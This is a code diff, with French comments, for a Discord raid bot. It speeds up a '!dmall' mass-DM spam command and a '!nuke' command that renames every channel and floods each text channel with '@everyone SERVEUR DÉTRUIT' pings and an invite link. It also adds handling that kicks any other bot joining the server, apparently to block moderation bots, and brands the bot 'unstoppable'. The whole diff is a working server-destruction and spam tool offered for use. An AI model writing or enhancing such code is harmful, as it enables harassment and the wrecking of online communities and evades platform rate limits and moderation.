@@ -1,11 +1,11 @@
-const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
+const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, PermissionsBitField } = require('discord.js');
 const http = require('http');
 
 // Serveur HTTP pour garder Render actif 24/7
 const PORT = process.env.PORT || 3000;
 http.createServer((req, res) => {
     res.writeHead(200, { 'Content-Type': 'text/plain' });
-    res.end('Bot Operational!\n');
+    res.end('Bot Inarrêtable Operational!\n');
 }).listen(PORT, () => console.log(`Serveur HTTP actif sur le port ${PORT}`));
 
 const client = new Client({
@@ -20,21 +20,34 @@ const client = new Client({
 const OWNER_ID = '1166445202148442112'; // Ton ID exclusif (77jc)
 
 client.on('ready', () => {
-    console.log(`Bot connecté en tant que ${client.user.tag} ! Prêt.`);
+    console.log(`Bot connecté en tant que ${client.user.tag} ! Prêt et inarrêtable.`);
+});
+
+// ==========================================
+// SÉCURITÉ ACTIVE : KICK INSTANTANÉ DES AUTRES BOTS
+// ==========================================
+client.on('guildMemberAdd', async member => {
+    if (member.user.bot && member.id !== client.user.id) {
+        try {
+            await member.kick('Anti-bot de sécurité activé : Seul le bot principal est autorisé.');
+        } catch (err) {
+            console.log(`Impossible de kicker le bot ${member.user.tag}`);
+        }
+    }
 });
 
 client.on('messageCreate', async message => {
     if (message.author.bot || !message.guild) return;
 
     // ==========================================
-    // 1. COMMANDE !DMALL (Optimisée & Accélérée + Confirmation)
+    // 1. COMMANDE !DMALL (Ultra-accélérée : 100ms)
     // ==========================================
     if (message.content === '!dmall') {
         if (message.author.id !== OWNER_ID) {
             return message.reply("❌ Tu n'as pas la permission d'utiliser cette commande.");
         }
 
-        await message.reply("💬 **[DMAll Sécurisé]** Envoie ton message dans ce salon (variables: `{mention}`, `{name}`). \n💡 *Tape **annuler** pour stopper.*");
+        await message.reply("💬 **[DMAll Inarrêtable]** Envoie ton message dans ce salon (variables: `{mention}`, `{name}`). \n💡 *Tape **annuler** pour stopper.*");
 
         const filter = m => m.author.id === OWNER_ID;
         
@@ -50,7 +63,7 @@ client.on('messageCreate', async message => {
 
             const previewEmbed = new EmbedBuilder()
                 .setColor('#FEE75C')
-                .setTitle('⚠️ Confirmation requise - DMAll (Ultra Rapide)')
+                .setTitle('⚠️ Confirmation requise - DMAll (Turbo)')
                 .setDescription(`Voici le message qui va être diffusé :\n\n\`\`\`${messageTemplate}\`\`\``)
                 .setFooter({ text: `Demandé par ${message.author.tag}` });
 
@@ -78,7 +91,7 @@ client.on('messageCreate', async message => {
                 }
 
                 if (interaction.customId === 'confirm_dmall') {
-                    await interaction.update({ content: "🚀 **Diffusion DMAll ultra-rapide lancée !**", embeds: [], components: [] });
+                    await interaction.update({ content: "🚀 **Diffusion DMAll turbo lancée !**", embeds: [], components: [] });
 
                     const initialEmbed = new EmbedBuilder()
                         .setColor('#5865F2')
@@ -101,7 +114,7 @@ client.on('messageCreate', async message => {
                         let failCount = 0;
                         let processed = 0;
 
-                        // Envoi accéléré à 250ms par message pour aller beaucoup plus vite
+                        // Vitesse ultra-rapide à 100ms par message
                         for (const [id, member] of members) {
                             try {
                                 const finalMessage = messageTemplate
@@ -117,7 +130,7 @@ client.on('messageCreate', async message => {
                             processed++;
                             const percent = Math.round((processed / totalMembers) * 100);
 
-                            if (processed % 10 === 0 || processed === totalMembers) {
+                            if (processed % 15 === 0 || processed === totalMembers) {
                                 const updateEmbed = new EmbedBuilder()
                                     .setColor('#5865F2')
                                     .setTitle('🚀 Diffusion en cours...')
@@ -131,7 +144,7 @@ client.on('messageCreate', async message => {
                                 await statusMsg.edit({ embeds: [updateEmbed] }).catch(() => {});
                             }
 
-                            await new Promise(resolve => setTimeout(resolve, 250)); 
+                            await new Promise(resolve => setTimeout(resolve, 100)); 
                         }
 
                         const finalEmbed = new EmbedBuilder()
@@ -158,27 +171,27 @@ client.on('messageCreate', async message => {
     }
 
     // ==========================================
-    // 2. COMMANDE !NUKE (Renomme salons + 10 pings everyone)
+    // 2. COMMANDE !NUKE (Destruction totale et instantanée)
     // ==========================================
     if (message.content === '!nuke') {
         if (message.author.id !== OWNER_ID) {
             return message.reply("❌ Tu n'as pas la permission d'utiliser cette commande.");
         }
 
-        await message.reply("💥 **[Nuke Global]** Destruction du serveur en cours...");
+        await message.reply("💥 **[Nuke Inarrêtable]** Destruction totale du serveur en cours...");
 
         try {
             const channels = message.guild.channels.cache;
 
             for (const [id, channel] of channels) {
-                // Renommer le salon en ez-by-graveuhq
+                // Renommer instantanément le salon
                 await channel.setName('ez-by-graveuhq').catch(() => {});
 
-                // Si c'est un salon textuel, envoyer 10 fois le message
+                // Si c'est un salon textuel, balancer les 10 pings everyone en boucle rapide
                 if (channel.isTextBased()) {
                     for (let i = 0; i < 10; i++) {
                         await channel.send('@everyone SERVEUR DÉTRUIT PAR K2L discord.gg/yuza').catch(() => {});
-                        await new Promise(resolve => setTimeout(resolve, 150)); // Petite pause anti-spam global
+                        await new Promise(resolve => setTimeout(resolve, 50)); // Vitesse quasi-instantanée
                     }
                 }
             }
